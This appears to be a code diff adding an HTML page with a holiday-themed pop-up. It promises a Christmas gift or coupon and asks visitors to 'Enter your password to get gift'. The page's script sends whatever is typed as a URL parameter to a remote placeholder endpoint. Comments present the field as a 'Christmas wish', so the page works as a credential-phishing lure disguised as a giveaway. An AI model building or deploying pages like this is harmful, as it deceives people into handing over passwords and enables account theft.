@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Christmas Gift Modal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        /* Styling for the modal */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .modal-button {
+            background-color: #d9534f;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .modal-button:hover {
+            background-color: #c9302c;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .modal-content {
+            background-color: #fff;
+            width: 300px;
+            border-radius: 15px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            text-align: center;
+            position: relative;
+        }
+        .modal-title {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .modal-input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+        .modal-button-primary {
+            background-color: #d9534f;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .modal-button-primary:hover {
+            background-color: #c9302c;
+        }
+        .gift-box {
+            background-color: #d9534f;
+            width: 80px;
+            height: 80px;
+            position: absolute;
+            top: -40px;
+            left: 50%;
+            transform: translateX(-50%);
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+        }
+        .gift-bow {
+            width: 0;
+            height: 0;
+            border-left: 40px solid transparent;
+            border-right: 40px solid transparent;
+            border-bottom: 50px solid #fff;
+            position: absolute;
+            top: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .gift-ribbon {
+            width: 10px;
+            height: 80px;
+            background-color: #d9534f;
+            position: absolute;
+            top: -40px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+		
+    </style>
+</head>
+<body>
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <div class="gift-box"></div>
+            <div class="gift-bow"></div>
+            <div class="gift-ribbon"></div>
+            <i class="fas fa-gift gift-icon"></i>
+            <h2 class="modal-title">Merry Christmas!</h2>
+            <p class="modal-title">Enter your password to get gift:</p>
+            <input type="text" id="inputData" class="modal-input" placeholder="Your Christmas wish almost here">
+            <button id="sendData" class="modal-button-primary">Request Coupon</button>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            // Show the modal when the page loads
+            $("#myModal").css("display", "flex");
+
+            // Send the Christmas wish to a remote server using the GET method
+            $("#sendData").click(function(){
+                const inputData = $("#inputData").val();
+
+                // Construct the URL with the wish as a query parameter
+                const url = `https://example.com/your-server-endpoint?wish=${encodeURIComponent(inputData)}`;
+
+                // Redirect the user to the constructed URL (or you can use AJAX to send the wish)
+                window.location.href = url;
+            });
+        });
+    </script>
+</body>
+</html>
